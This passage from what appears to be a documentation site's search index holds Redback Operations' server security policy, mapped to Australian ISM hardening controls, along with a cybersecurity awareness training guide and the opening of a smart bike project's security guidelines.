organization-approved set of executables, libraries, scripts, installers, compiled HTML, and control panel applets.ISM-1658: Execution of drivers restricted to an organization-approved set.ISM-0955: Application control uses cryptographic hash rules, publisher certificate rules, or path rules.ISM-1471: When using publisher certificate rules, both publisher and product names are used.ISM-1392: Path rules only allow approved users to modify files and folders.ISM-1746: Path rules only allow approved users to change file system permissions.ISM-1544: Microsoft's application blocklist is implemented.ISM-1659: Microsoft’s vulnerable driver blocklist is implemented.ISM-1582: Application control rulesets are validated annually or more frequently.ISM-0846: All users, except local admin and break-glass accounts, cannot bypass or disable application control.ISM-1660: Allowed and blocked application control events are centrally logged.ISM-1889: Command line process creation events are centrally logged.ISM-1621: Disable or remove Windows PowerShell 2.0.ISM-1622: Configure PowerShell to use Constrained Language Mode.ISM-1623: Log PowerShell module, script block, and transcription events centrally.ISM-1624: Protect PowerShell script block logs with Protected Event Logging.    ","version":"Next","tagName":"h3"},{"title":"Intrusion Prevention, Software Firewalls, Antivirus, and Device Access Control​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#intrusion-prevention-software-firewalls-antivirus-and-device-access-control","content":" Host-Based Intrusion Prevention System (HIPS)​  Signature-based detection can miss new variants of malware. A Host-based Intrusion Prevention System (HIPS) uses behaviour-based detection to identify and block malicious activity, providing an extra layer of security for both workstations and critical servers at Redback Operations.  Software Firewall​  Network firewalls generally control communication between network segments based on ports and protocols but often fail to prevent malware propagation or data exfiltration. Software firewalls offer more granular control, allowing communication restrictions based on specific applications or services, effectively safeguarding servers, and workstations.  Antivirus Software​  Malicious actors frequently reuse known vulnerabilities, and antivirus software on workstations and servers provides protection by leveraging signature-based, heuristic, and reputation-rating detection. Regular scanning and timely updates reduce the risk of exploitation.  Device Access Control Software​  External communication interfaces that facilitate Direct Memory Access (DMA) or removable media can be exploited if improperly managed, posing significant security risks. Device access control software or disabling external interfaces minimizes the risk.  Control References​  ISM-1034: Implement a HIPS on critical and high-value servers.ISM-1416: Implement a software firewall on workstations and servers to control inbound and outbound network connections to an approved set of applications and services.ISM-1417: Implement antivirus software with: Signature-based detection enabled at a high level.Heuristic-based detection enabled at a high level.Reputation rating functionality enabled.Ransomware protection functionality enabled.Signature updates configured for daily updates.Regular scanning of all fixed disks and removable media. ISM-1418: If there is no business requirement for reading from removable media and devices, disable this functionality using device access control software or by disabling external communication interfaces.ISM-0343: If there is no business requirement for writing to removable media and devices, disable this functionality.ISM-0345: Disable external communication interfaces that allow DMA.    ","version":"Next","tagName":"h3"},{"title":"Operating System Event Logging​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#operating-system-event-logging","content":" Note: Refer to the Monitoring &amp; Log Analytics Policy within the ISMS for further information.  Centrally logging and analysing operating system events is essential for monitoring system security, detecting malicious activity, and supporting investigations following cybersecurity incidents. At Redback Operations, the following operating system events are logged centrally:  Track when applications or the operating system experience crashes or generate error messages.Record changes to security policies or system configurations that could impact the security posture.Monitor successful and failed user logons and account lockouts.Log process and service failures, restarts, and changes to important processes or services.Record requests made to access internet resources for anomaly detection.Document security product-related events, such as antivirus or firewall actions.Capture information about when systems start up and shut down.  Control Reference:​  ISM-0582: Centrally log these operating system events: Track when applications or the operating system experience crashes or generate error messages.Record changes to security policies or system configurations that could impact the security posture.Monitor successful and failed user logons and account lockouts.Log process and service failures, restarts, and changes to important processes or services.Record requests made to access internet resources for anomaly detection.Document security product-related events, such as antivirus or firewall actions.Capture information about when systems start up and shut down.    ","version":"Next","tagName":"h3"},{"title":"User Application Hardening​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#user-application-hardening","content":" User Applications​  This section pertains to applications typically installed on workstations and occasionally on servers (such as Remote Desktop Servers), such as office productivity suites, web browsers, email clients, PDF software, and security products like antivirus and firewalls.  User Application Selection​  To minimize vulnerabilities, Redback Operations should prioritize vendors that adhere to secure-by-design and secure-by-default principles, use memory-safe programming languages, follow secure programming practices, and maintain their products' security. Redback Operations should prioritize vendors that:  Follow secure-by-design and secure-by-default principles.Use memory-safe programming languages when possible.Demonstrate secure programming practices and maintain their products' security.  User Application Releases​  Newer releases often contain improved security features that make exploitation more difficult. Using the latest releases ensures protection against known vulnerabilities.  Hardening User Application Configurations​  Proper configuration hardening prevents exploitation by malicious actors. The following controls should be followed:  Develop, implement, and maintain approved configurations for all user applications.Change default accounts or credentials, including pre-configured accounts.Disable or remove unneeded components and features.Restrict add-ons, extensions, and plug-ins to an approved set.Microsoft Office: Block creating child processes, executable content, or injecting code.Prevent activation of Object Linking and Embedding packages.Harden office productivity suites per ASD and vendor guidance.Prevent changes to office security settings by users. Web Browsers: Block Java and web advertisements from the Internet.Harden web browsers per ASD and vendor guidance.Prevent changes to browser security settings by users. PDF Software: Block creating child processes.Harden per ASD and vendor guidance.Prevent changes to PDF security settings by users. Prevent changes to email client security settings by users.Prevent changes to security product settings by users.Implement Microsoft’s attack surface reduction rules where applicable.  Control References:​  ISM-1915: Approved configurations developed, implemented, and maintained.ISM-1806: Change default accounts and credentials.ISM-1470: Disable/remove unneeded components.ISM-1235: Restrict add-ons and plug-ins.ISM-1667: Microsoft Office blocked from creating child processes.ISM-1668: Microsoft Office blocked from creating executable content.ISM-1669: Microsoft Office blocked from injecting code.ISM-1542: Prevent activation of Object Linking and Embedding packages.ISM-1859: Harden office productivity suites.ISM-1823: Prevent changes to Office security settings.ISM-1486: Web browsers blocked from processing Java.ISM-1485: Web browsers blocked from processing web advertisements.ISM-1412: Harden web browsers.ISM-1585: Prevent changes to browser security settings.ISM-1670: Block PDF software from creating child processes.ISM-1860: Harden PDF software.ISM-1824: Prevent changes to PDF security settings.ISM-1601: Implement Microsoft’s attack surface reduction rules.ISM-1748: Prevent changes to email client security settings.ISM-1825: Prevent changes to security product security settings.    ","version":"Next","tagName":"h3"},{"title":"Microsoft Office Macros​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#microsoft-office-macros","content":" Microsoft Office macros are written in Visual Basic for Applications and can automate tasks, enhancing productivity. However, macros can be exploited by malicious actors to compromise systems. Therefore, Redback Operations enforces strict controls over macro usage to minimize risks.  Disable Microsoft Office macros for users who lack a demonstrated business need.Prevent macros in Microsoft Office files originating from the internet.Enable Microsoft Office macro antivirus scanning.Stop Microsoft Office macros from making Win32 API calls.Allow macros only if they run within a sandboxed environment, Trusted Location, or are signed by a trusted publisher.Verify macros are free from malicious code before signing or placing them in Trusted Locations.Limit modification rights to Trusted Location content to privileged users responsible for macro verification.Block macros signed by untrusted publishers or those using non-V3 signatures via the Message Bar or Backstage View.Validate Microsoft Office’s list of trusted publishers annually or more frequently.Prevent users from changing Microsoft Office macro security settings.Log all allowed and blocked macro execution events centrally.  Control References​  ISM-1671: Disable Microsoft Office macros for users without a demonstrated business requirement.ISM-1488: Block macros in Microsoft Office files originating from the internet.ISM-1672: Enable Microsoft Office macro antivirus scanning.ISM-1673: Block Microsoft Office macros from making Win32 API calls.ISM-1674: Allow macros only if running from within a sandboxed environment, Trusted Location, or digitally signed by a trusted publisher.ISM-1890: Verify that macros are free of malicious code before signing or placing them in Trusted Locations.ISM-1487: Only privileged users can modify Trusted Location content.ISM-1675: Block macros digitally signed by untrusted publishers via the Message Bar or Backstage View.ISM-1891: Block macros signed with non-V3 signatures via the Message Bar or Backstage View.ISM-1676: Validate Microsoft Office’s list of trusted publishers annually or more frequently.ISM-1489: Prevent users from changing Microsoft Office macro security settings.ISM-1677: Centrally log allowed and blocked Microsoft Office macro execution events.    ","version":"Next","tagName":"h3"},{"title":"Server Application Hardening​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#server-application-hardening","content":" Server Applications​  This section covers applications with specific server functionality, such as Microsoft Active Directory Domain Services (AD DS), database management systems, email servers, and web hosting software.  Note: User applications are covered under user application hardening.  Server Application Selection​  Selecting server applications from vendors that follow secure-by-design and secure-by-default principles is critical to minimizing vulnerabilities. Vendors should also use memory-safe programming languages (C#, Go, Java, Ruby, Rust, Swift) and maintain secure programming practices. Redback Operations should prioritize vendors that:  Follow secure-by-design and secure-by-default principles.Use memory-safe programming languages where possible (C#, Go, Java, Ruby, Rust, Swift).Maintain secure programming practices and product security.  Server Application Releases​  Newer server application releases include improved security features that complicate exploitation by malicious actors. Using unsupported versions leaves organizations exposed to previously mitigated vulnerabilities.  Hardening Server Application Configurations​  Default or unapproved configurations can lead to an insecure environment, making server applications prime targets for exploitation. Redback Operations should:  Develop, implement, and maintain approved configurations for server applications.Use ASD and vendor guidance for hardening, prioritizing the most restrictive advice in case of conflicts.Modify default accounts or credentials, including pre-configured accounts.Disable or remove unneeded accounts, components, services, and features.Remove installation files and logs once applications are fully installed.  Restricting Privileges for Server Applications​  If a server application runs as a local administrator or root account, it can pose a significant security risk. Applications should:  Configure server applications to run as separate accounts with the minimum privileges needed.Restrict the file system access of accounts under which server applications run.  Control References​  ISM-1826: Choose server applications from vendors committed to secure principles and practices.ISM-1483: Use the latest release of internet-facing server applications.ISM-1916: Develop and maintain approved configurations.ISM-1246: Harden server applications using ASD and vendor guidance.ISM-1260: Change default accounts and credentials.ISM-1247: Disable or remove unneeded features.ISM-1245: Remove temporary installation files and logs.ISM-1249: Configure server applications to run as separate accounts with minimal privileges.ISM-1250: Limit file system access for server application accounts.    ","version":"Next","tagName":"h3"},{"title":"Microsoft Active Directory Domain Services (AD DS) Hardening​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#microsoft-active-directory-domain-services-ad-ds-hardening","content":" Microsoft AD DS Domain Controllers Microsoft AD DS domain controllers contain highly sensitive data, including hashed credentials. Dedicated domain administrator accounts should be exclusively used for AD DS management, ensuring they can't be used to administer other systems.  Disable the Print Spooler service on these controllers.Avoid using passwords in Group Policy PreferencesCentrally log security events.  Microsoft AD DS Account Hardening​  Misconfigured accounts pose a significant security risk. Malicious actors can gain access to AD DS and move laterally throughout the network. Redback Operations mitigates these risks by implementing the following guidelines:  Only configure service and computer accounts with Service Principal Names (SPNs).Ensure service accounts have minimal privileges and exclude them from the domain administrators’ group.Prevent duplicate SPNs within the domain.Configure privileged accounts as sensitive and prevent delegation.Require user accounts to use Kerberos pre-authentication.Password Management: Don't use &quot;password never expires&quot; or &quot;password not required&quot; settings.Avoid storing passwords in properties accessible to unprivileged users.Don't use reversible encryption. Domain Access Control: Prevent unprivileged users from adding machines to the domain.Use dedicated service accounts for adding machines. Review user accounts with unconstrained delegation annually and remove those lacking a business requirement.Prevent non-domain controller computer accounts from being trusted for delegation.    ","version":"Next","tagName":"h3"},{"title":"Microsoft AD DS Security Group Memberships​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#microsoft-ad-ds-security-group-memberships","content":" Built-in security groups have elevated permissions that can be exploited. Limit vulnerabilities by ensuring:  Privileged accounts are members of the Protected Users group.Remove disabled accounts from security groups.Ensure no user accounts are part of the Pre-Windows 2000 Compatible Access group.  Control References​  ISM-1827: Administer AD DS using dedicated domain administrator accounts.ISM-1828: Disable the Print Spooler service on AD DS domain controllers.ISM-1829: Avoid using passwords and passwords in Group Policy Preferences.ISM-1830: Centrally log AD DS security-related events.ISM-1832 to ISM-1844: Apply comprehensive account hardening controls.ISM-1620: Add privileged accounts to the Protected Users security group.ISM-1845: Remove disabled accounts from security groups.ISM-1846: Ensure the Pre-Windows 2000 group contains no user accounts.    ","version":"Next","tagName":"h3"},{"title":"Authentication Hardening​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#authentication-hardening","content":" Account and Authentication Types​  These guidelines apply to all account types, including unprivileged, privileged, break glass, and service accounts, covering both interactive and non-interactive authentication.  Authenticating to Systems​  Users must be authenticated before gaining access to a system and its resources. This can be achieved via multi-factor authentication (MFA), such as a username with a passphrase and security key, or through single-factor authentication (SFA) as a less secure alternative.  Authenticate users before granting system access.  Insecure Authentication Methods​  Authentication methods must resist theft, interception, duplication, forgery, unauthorized access, and modification. Weak hashing algorithms in Local Area Network (LAN) Manager and NT LAN Manager (NTLM) can be easily compromised. Disable these protocols and use Kerberos for Windows authentication.  Disable authentication methods susceptible to replay attacks.Disable LAN Manager and NTLM authentication methods.  Multi-Factor Authentication (MFA)​  MFA uses two or more factors to confirm user identity:  Knowledge Factors: Memorized secrets (e.g., PINs, passwords).Possession Factors: Security keys, smart cards, or OTP tokens.Inherence Factors: Biometric data (e.g., fingerprints, facial recognition).  MFA is vital for administrative activities, online services, privileged accounts, and data repositories. It helps slow down or prevent attackers from gaining unrestricted access. Key points include:  Ensure MFA used for authenticating online services, data repositories, and systems is phishing resistant.Log successful and unsuccessful MFA events centrally.  Single-Factor Authentication​  Single-factor authentication (SFA) remains vulnerable to credential cracking tools. If multi-factor authentication (MFA) is not supported, use SFA with strong passphrases. Key recommendations include:  Use passphrases consisting of at least four random words (or longer, depending on classification level).Avoid categorically predictable words, meaningful sentences, or publicly available material.Log successful and unsuccessful SFA events centrally to detect malicious behaviour.  Setting Credentials for User Accounts​  Ensure credentials for user accounts are securely issued and managed:  Verify the user's identity before issuing new credentials.Credentials should be randomly generated.Provide credentials via a secure channel or split into two parts (user and supervisor).Ensure users change credentials on first use.Prevent users from reusing memorized credentials across systems.  Setting Credentials for Break Glass, Local Administrator, and Service Accounts​  Common usernames or weak credentials can lead to rapid exploitation of break glass, local administrator, and service accounts. Secure these accounts by following these guidelines:  Ensure credentials are long (at least 30 characters), unique, and unpredictable.Use Microsoft's group Managed Service Accounts (gMSA) to automatically manage service account credentials.Credentials for break glass, local administrator, and service accounts are long, unique, and managed.Credentials for these accounts are a minimum of 30 characters.Create service accounts as group Managed Service Accounts.  Changing Credentials​  Credentials typically do not require frequent changes unless specific conditions arise:  Update credentials when compromised, suspected of compromise, stored/transferred in the clear, shared account membership changes, or when not changed in 12 months.Change KRBTGT credentials twice if the domain is compromised, suspected of compromise, or if not updated in 12 months.  Protecting Credentials​  Protect credentials by following these guidelines:  Keep credentials separate from systems they authenticate to unless used for authentication activities.Conceal credentials as they are entered into systems to prevent screen scrapers and shoulder surfers.Use memory integrity, Local Security Authority, Credential Guard, and Remote Credential Guard functionality, preferably with UEFI lock.Limit cached credentials to one previous logon.Protect credentials with a password manager, hardware security module, or by hashing, salting, and stretching them before storage in a database.Regularly scan networks to identify and remediate credentials stored in the clear.  Account Lockouts​  Locking accounts after several failed attempts reduces the success rate of brute-force attacks like credential guessing or spraying. Implement these practices:  Lock accounts (except break glass) after a maximum of five failed logon attempts.  Session Termination​  Terminating user sessions daily and after inactivity supports system maintenance and helps remove malicious actors lacking persistence.  Session and Screen Locking​  Session and screen locks prevent unauthorized access to authenticated sessions. Key requirements include:  Activate after 15 minutes of inactivity or when manually triggered.Ensure session content is concealed and the screen does not enter power-saving mode before locking.Require users to authenticate to unlock.Deny users the ability to disable the screen lock.  Logon Banner​  A logon banner reminds users of security responsibilities when accessing systems. Include:  System sensitivity/classification, access requirements, usage policies, and monitoring activities.  Control Reference:​  ISM-1546: Users are authenticated before they are granted access to a system and its resources.ISM-1603: Authentication methods susceptible to replay attacks are disabled.ISM-1055: LAN Manager and NT LAN Manager authentication methods are disabled.ISM-1504: Multi-factor authentication is used to authenticate users to their organisation’s online services that process, store, or communicate their organisation’s sensitive data.ISM-1679: Multi-factor authentication is used to authenticate users to third-party online services that process, store, or communicate their organisation’s sensitive data.ISM-1680: Multi-factor authentication (where available) is used to authenticate users to third-party online services that process, store, or communicate their organisation’s non-sensitive data.ISM-1892: Multi-factor authentication is used to authenticate users to their organisation’s online customer services that process, store, or communicate their organisation’s sensitive customer data.ISM-1893: Multi-factor authentication is used to authenticate users to third-party online customer services that process, store, or communicate their organisation’s sensitive customer data.ISM-1681: Multi-factor authentication is used to authenticate customers to online customer services that process, store, or communicate sensitive customer data.ISM-1173: Multi-factor authentication is used to authenticate privileged users of systems.ISM-0974: Multi-factor authentication is used to authenticate unprivileged users of systems.ISM-1505: Multi-factor authentication is used to authenticate users of data repositories.ISM-1401: Multi-factor authentication uses either: something users have and something users know, or something users have that is unlocked by something users know or are.ISM-1872: Multi-factor authentication used for authenticating users of online services is phishing-resistant.ISM-1873: Multi-factor authentication used for authenticating customers of online customer services provides a phishing-resistant option.ISM-1874: Multi-factor authentication used for authenticating customers of online customer services is phishing-resistant.ISM-1682: Multi-factor authentication used for authenticating users of systems is phishing-resistant.ISM-1894: Multi-factor authentication used for authenticating users of data repositories is phishing-resistant.ISM-1559: Memorised secrets used for multi-factor authentication are a minimum of 6 characters unless more stringent requirements apply.ISM-1560: Memorised secrets used for multi-factor authentication on SECRET systems are a minimum of 8 characters.ISM-1561: Memorised secrets used for multi-factor authentication on TOP SECRET systems are a minimum of 10 characters.ISM-1683: Successful and unsuccessful multi-factor authentication events are centrally logged.ISM-0417: When systems cannot support multi-factor authentication, single-factor authentication using passphrases is implemented instead.ISM-0421: Passphrases used for single-factor authentication are at least 4 random words with a total minimum length of 14 characters unless more stringent requirements apply.ISM-1557: Passphrases used for single-factor authentication on SECRET systems are at least 5 random words with a total minimum length of 17 characters.ISM-0422: Passphrases used for single-factor authentication on TOP SECRET systems are at least 6 random words with a total minimum length of 20 characters.ISM-1558: Passphrases used for single-factor authentication are not a list of categorised words; do not form a real sentence in a natural language; and are not constructed from song lyrics, movies, literature, or any other publicly available material.ISM-1895: Successful and unsuccessful single-factor authentication events are centrally logged.ISM-1593: Users provide sufficient evidence to verify their identity when requesting new credentials.ISM-1227: Credentials set for user accounts are randomly generated.ISM-1594: Credentials are provided to users via a secure communications channel or, if not possible, split into two parts with one part provided to users and the other part provided to supervisors.ISM-1595: Credentials provided to users are changed on first use.ISM-1596: Credentials, in the form of memorised secrets, are not reused by users across different systems.ISM-1685: Credentials for break glass accounts, local administrator accounts, and service accounts are long, unique, unpredictable, and managed.ISM-1795: Credentials for break glass accounts, local administrator accounts, and service accounts are a minimum of 30 characters.ISM-1619: Service accounts are created as group Managed Service Accounts.ISM-1590: Credentials are changed if: they are compromised.they are suspected of being compromised.they are discovered stored on networks in the clearthey are discovered being transferred across networks in the clearmembership of a shared account changesthey have not been changed in the past 12 months. ISM-1847: Credentials for the Kerberos Key Distribution Centre’s service account (KRBTGT) is changed twice, allowing for replication to all Microsoft Active Directory Domain Services domain controllers in-between each change, if: the domain has been directly compromised.the domain is suspected of being compromised.they have not been changed in the past 12 months. ISM-0418: Credentials are kept separate from systems they are used to authenticate to, except for when performing authentication activities.ISM-1597: Credentials are obscured as they are entered into systems.ISM-1896: Memory integrity functionality is enabled.ISM-1861: Local Security Authority protection functionality is enabled.ISM-1686: Credential Guard functionality is enabled.ISM-1897: Remote Credential Guard functionality is enabled.ISM-1749: Cached credentials are limited to one previous logon.ISM-1402: Credentials stored on systems are protected by a password manager; a hardware security module; or by salting, hashing, and stretching them before storage within a database.ISM-1875: Networks are scanned at least monthly to identify any credentials that are being stored in the clear.ISM-0428: Implement comprehensive session/screen locking practices.ISM-0428: Implement comprehensive session/screen locking practices.ISM-0408: Display a logon banner reminding users of security responsibilities.ISM-0428: Implement comprehensive session/screen locking practices.    ","version":"Next","tagName":"h3"},{"title":"Virtualization Hardening​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#virtualization-hardening","content":" Hypervisors​  Both Type 1 and Type 2 hypervisors must be treated according to their role:  Type 1 Hypervisors: Run on bare metal and should be treated as lightweight operating systems.Type 2 Hypervisors: Run on top of general-purpose operating systems and should be treated as applications.  Containerization​  Containers offer versatile deployment but must be managed like any system.  Applying patches and ensuring patched images are used is crucial.  Functional Separation Between Computing Environments​  Malicious actors can exploit misconfigurations or vulnerabilities in software-based isolation mechanisms to compromise multiple environments. Key practices include:  Choose isolation mechanism vendors following secure-by-design and secure-by-default principles while maintaining product security.Restrict administrative access and remove unnecessary functionality from isolation mechanisms.Secure the underlying operating system through comprehensive hardening.Promptly apply patches, updates, and mitigations for both the isolation mechanism and underlying OS.Replace outdated isolation mechanisms and OS software.Perform integrity and log monitoring for both isolation mechanisms and underlying OS.Physical servers used for SECRET and TOP SECRET computing environments should only host environments of the same classification and security domain.  Control References:​  ISM-1460: Select isolation mechanisms from secure vendors.ISM-1604: Harden isolation mechanisms and restrict administrative access.ISM-1605: Harden the underlying OS.ISM-1606: Apply patches, updates, and mitigations promptly.ISM-1848: Replace isolation mechanisms and OS when unsupported.ISM-1607: Monitor integrity and logs of isolation mechanisms and OS.ISM-1461: Use servers of the same classification/security domain for SECRET/TS environments.    ","version":"Next","tagName":"h3"},{"title":"Policy Review​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#policy-review","content":" The objective of this policy review section is to ensure that the security controls and guidelines within the Server Security Policy remain relevant, effective, and aligned with evolving security threats, organizational needs, and compliance requirements.  Note: Company layout and infrastructure does not reflect the standards outline in this policy at the time of this document’s creation and is considered a long-term strategy to implement when company maturity has improved.  ","version":"Next","tagName":"h2"},{"title":"Audit and Update Frequency (Summary with further information below)​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#audit-and-update-frequency-summary-with-further-information-below","content":" Annual Review: Every 12 months.Ad-Hoc Review: After significant technology, compliance, or business changes.Expiry Date: Clearly set at 1 May 2026 (renew or update before this date).  ","version":"Next","tagName":"h3"},{"title":"Responsibility for Reviews​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#responsibility-for-reviews","content":" The Chief Information Security Officer (CISO) is designated as the primary initiator of the reviews for the cyber security policy at Redback Operations. A review committee assists in evaluating the effectiveness and relevance of the policy.  ","version":"Next","tagName":"h3"},{"title":"Frequency of Reviews​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#frequency-of-reviews","content":" Reviews are scheduled to occur at least annually. However, more frequent reviews are conducted if there are significant changes in technology, business practices, or compliance requirements. Ad-hoc reviews are also permitted in response to security incidents or major failures in the existing policy.  ","version":"Next","tagName":"h3"},{"title":"Proposing and Approving Changes​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#proposing-and-approving-changes","content":" Any member of the review committee can propose changes during the review process. These proposals should be supported by a rationale and, where possible, data to substantiate the change. After a thorough discussion within the committee, the CISO presents the proposed changes to senior management for approval.  ","version":"Next","tagName":"h3"},{"title":"Communication Plan for Updates​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#communication-plan-for-updates","content":" Once changes are approved, the updated policy is communicated to all stakeholders through internal memos, meetings, and training sessions. All employees must understand the changes and how they impact their roles and responsibilities. Regular training sessions are updated to reflect the new policy standards.    ","version":"Next","tagName":"h3"},{"title":"Appendix​","type":1,"pageTitle":"Server Security Policy","url":"/redback-documentation/docs/company-policy/ISMS/server-security#appendix","content":" https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/ism/cyber-security-guidelines/guidelines-system-hardening  (Australian Signals Directorate, Guidelines for System Hardening, May 12 2024) ","version":"Next","tagName":"h2"},{"title":"Cybersecurity User Awareness Training - Subject Guide","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/Subject_Guide","content":"","keywords":"","version":"Next"},{"title":"Duration:​","type":1,"pageTitle":"Cybersecurity User Awareness Training - Subject Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/Subject_Guide#duration","content":" Expected time to complete – 1 Hour  ","version":"Next","tagName":"h2"},{"title":"Contacts:​","type":1,"pageTitle":"Cybersecurity User Awareness Training - Subject Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/Subject_Guide#contacts","content":" Team Responsible for training – Blue Team  Member responsible for training – Tristan Apperley  Blue Team Leader - Devika Sivakumar  ","version":"Next","tagName":"h2"},{"title":"Modules​","type":1,"pageTitle":"Cybersecurity User Awareness Training - Subject Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/Subject_Guide#modules","content":" ","version":"Next","tagName":"h2"},{"title":"Module 1 – Introduction​","type":1,"pageTitle":"Cybersecurity User Awareness Training - Subject Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/Subject_Guide#module-1--introduction","content":" Learning Outcome 1: Understand the importance of cyber security training, identify Redback Operations IT security contacts, recognise different user privileges, and know the steps for incident reporting.  Why this training is requiredRedback Operations IT security Point of ContactsWhy we have different levels of user privilegesWhat to do when you identify an incident  ","version":"Next","tagName":"h3"},{"title":"Module 2 - Update your device and software​","type":1,"pageTitle":"Cybersecurity User Awareness Training - Subject Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/Subject_Guide#module-2---update-your-device-and-software","content":" Learning Outcome 2: Explain the need for updates, recognise zero-day vulnerabilities, manage automatic updates, and adhere to update frequency guidelines.  Why you should update your device and softwareZero-day vulnerabilitiesAutomatic updatesUpdate Frequency  ","version":"Next","tagName":"h3"},{"title":"Module 3 - Set up and perform regular backups​","type":1,"pageTitle":"Cybersecurity User Awareness Training - Subject Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/Subject_Guide#module-3---set-up-and-perform-regular-backups","content":" Learning Outcome 3: Understand backup importance, differentiate backup types, implement secure storage, and follow Redback Operations’ backup procedures.  Importance of backupsTypes of backups including AutomaticSecure storage of backupsRedback Operations backup procedures  ","version":"Next","tagName":"h3"},{"title":"Module 4 - Turn on multi-factor authentication (MFA)​","type":1,"pageTitle":"Cybersecurity User Awareness Training - Subject Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/Subject_Guide#module-4---turn-on-multi-factor-authentication-mfa","content":" Learning Outcome 4: Define MFA, distinguish between MFA types, and evaluate MFA benefits.  What is MFATypes of MFATokenBiometricsAuthenticator AppSMS/EmailBenefits of MFA  ","version":"Next","tagName":"h3"},{"title":"Module 5 - Set secure passphrases​","type":1,"pageTitle":"Cybersecurity User Awareness Training - Subject Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/Subject_Guide#module-5---set-secure-passphrases","content":" Learning Outcome 5: Differentiate passphrases from passwords, identify characteristics of secure passphrases, and use password managers effectively.  Passphrases Vs PasswordsCharacteristics of a secure passphrasePassword managers  ","version":"Next","tagName":"h3"},{"title":"Module 6 - Recognise and report scams​","type":1,"pageTitle":"Cybersecurity User Awareness Training - Subject Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/Subject_Guide#module-6---recognise-and-report-scams","content":" Learning Outcome 6: Identify common scams, recognise scam indicators, and understand Redback Operations reporting procedures.  Common types of ScamsHow to identify a scamReporting scam  ","version":"Next","tagName":"h3"},{"title":"Module 7 - Watch out for threats​","type":1,"pageTitle":"Cybersecurity User Awareness Training - Subject Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/Subject_Guide#module-7---watch-out-for-threats","content":" Learning Outcome 7: Identify various cyber threats, recognise indicators of compromise, and apply preventive measures.  Types of threatsAccount CompromiseCrypto miningData BreachesHackingIdentity theftMalicious insidersMalwarePhishingQuishingRansomwareScamsIndicators of compromisePreventive measures  ","version":"Next","tagName":"h3"},{"title":"Module 8 - Final Quiz​","type":1,"pageTitle":"Cybersecurity User Awareness Training - Subject Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/Subject_Guide#module-8---final-quiz","content":" Students are required to score 80% to have satisfactory passed the awareness training.  ","version":"Next","tagName":"h3"},{"title":"Classroom link​","type":1,"pageTitle":"Cybersecurity User Awareness Training - Subject Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/Subject_Guide#classroom-link","content":" Training Link – Training is hosted on Google classroom and can completed by clicking here NOTE: A google account will be required to complete this training, if required you can sign up to google by clicking on the following linkCreate your Google Account  ","version":"Next","tagName":"h2"},{"title":"References​","type":1,"pageTitle":"Cybersecurity User Awareness Training - Subject Guide","url":"/redback-documentation/docs/cybersecurity/Blue Team/Awareness-Training/Subject_Guide#references","content":" Australian Cyber Security Centre. (2024). Guidelines for personnel security (June 2024). Australian Government. https://www.cyber.gov.au/sites/default/files/2024-06/08.%20ISM%20-%20Guidelines%20for%20Personnel%20Security%20%28June%202024%29.pdf  Australian Cyber Security Centre. (n.d.). Learn the basics. Australian Government. https://www.cyber.gov.au/learn-basics ","version":"Next","tagName":"h2"},{"title":"Project 1 - Smart Bike Project","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1","content":"","keywords":"","version":"Next"},{"title":"Purpose and Scope of the Policy​","type":1,"pageTitle":"Project 1 - Smart Bike Project","url":"/redback-documentation/docs/cybersecurity/Archive/guidelines/project-1#purpose-and-scope-of-the-policy","content":" The Cyber Security Guidelines (the Guidelines) outline cyber security standards recommended for Redback Operations. The Guidelines are intended to be read and implemented by Team Leaders and Support.  The Guidelines are prescribed for internal purposes and should be referred to as a cyber security policy. Whilst the Guidelines are not enforceable, it is strongly encouraged that compliance is exercised within the company. If the policy conflicts with legislation or law, the relevant law or legislation will take precedence. The organisation is encouraged to consult the Privacy Act 1988, the Security of Critical Infrastructure Act 2018 and the Telecommunications (Interception and Access) Act 1979 in the formation of the company. Guidance is also sought from the European framework of the General Data Protection Regulation (GDPR) where the data subjects are located in the EU.1  The company should be able to demonstrate adherence to these principles in order to protect its systems and data from cyber threats.  ","version":"Next","tagName":"h2"},{"title":"Roles and Responsibilities​","type":1,"pageTitle":"Project 1 - Smart Bike 